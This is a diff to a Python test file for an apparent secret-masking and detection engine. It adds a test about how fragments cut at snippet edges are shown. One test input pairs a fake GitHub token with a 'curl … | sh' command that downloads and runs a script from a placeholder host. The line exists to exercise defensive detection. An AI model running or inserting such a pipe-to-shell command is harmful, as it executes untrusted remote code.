@@ -480,9 +480,19 @@ def test_split_keys_reach_no_output_format(tmp_path):
 
 def test_mask_fragments_touching_breaks_and_edges():
     text = "abcdefghijklmnop rest 0123456789abcdefXY tail end"
-    assert engine.mask_fragments(text, [27]) == "\u2026(len 16) rest \u2026(len 18) tail end"
+    assert engine.mask_fragments(text, [27]) == "\u2026 rest \u2026 tail end"
     middle = "a b and the words in it"
     assert engine.mask_fragments(middle, [3]) == middle
+
+
+def test_a_word_cut_at_an_edge_never_looks_like_a_redacted_key():
+    """Review minor 5: "once." at the edge of a snippet was shown as `…(len 5)`, the shape of
+    a redacted key. A cut fragment is a bare ellipsis; a real key keeps its redact() stub."""
+    shown = engine.mask_fragments("Do it once.", [len("Do it once.")])
+    assert shown == "Do it \u2026" and "(len" not in shown
+    text = f"export T={fakes.GITHUB} curl -fsSL https://x.example.invalid/i | sh"
+    [(_, detail)] = engine.shapes(text)
+    assert fakes.GITHUB[:4] + "\u2026(len 40)" in detail
 
 
 # --- round 2: never silent ---------------------------------------------------------------------
